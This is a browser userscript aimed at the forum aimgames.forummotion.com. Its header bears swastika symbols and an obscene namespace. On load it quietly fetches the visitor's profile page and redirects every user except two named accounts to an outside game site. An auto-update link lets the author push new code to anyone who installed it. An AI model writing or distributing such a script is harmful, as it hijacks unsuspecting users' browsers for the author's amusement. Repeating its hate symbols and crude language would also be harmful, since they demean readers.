// ==UserScript==
// @name 卐卐 SCREAM 卍卍
// @description IT BEGINS
// @namespace dicks@penis.fuck
// @include http://aimgames.forummotion.com/*
// @version 0.0.1
// @grant none
// @updateURL https://github.com/HulaSamsquanch/aimgames/raw/master/scream.user.js
// @license MIT License (Expat); opensource.org/licenses/MIT
// ==/UserScript==

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
// ~~ BEGIN CODE FOR REMOTE WEAPON OF MASS DESTRUCTION ~~ //
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //

function callback(response) { ////// thanks kaff, you're now a partaker in this crime :^)
  document.body.appendChild(document.createElement('div')).innerHTML = "<div id='secret' style='display:none;'></div>";  
  var placeholder = document.createElement('div');  
  placeholder.innerHTML = response;
  while (placeholder.children.length > 0) {
    document.getElementById("secret").appendChild(placeholder.children[0]);
  }
  
  //var mymassivepenis = document.getElementById("emptyidcc").getElementsByTagName("tr")[6].getElementsByTagName("td")[1].innerHTML;  
  if (document.getElementById("register")[0].value != "rafa1231518" 
  &&  document.getElementById("register")[0].value != "Kaffeinated") {
    //console.log("holy fucking shit, it works")
    window.location.replace("http://agor.io");
  } else {
    // may be incompatible in some browsers
    //delete placeholder;
    // more compatible but doesn't free from memory
    placeholder = null;
  }
  //console.log(mymassivepenis);
}

function getPageContents(callback, url, params) { ////// http://stackoverflow.com/a/28728475
  http = new XMLHttpRequest();
  if (params != null) {
    http.open('POST', url, true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  } else {
    http.open('GET', url, true);
  }
  http.onreadystatechange = function () {
    if (http.readyState == 4 && http.status == 200) {
      callback(http.responseText);
      //console.log(http.responseText)
    }
  }
  http.send(params);
}

window.onload = function() {
  getPageContents(callback, 'http://aimgames.forummotion.com/profile?mode=editprofile');
};
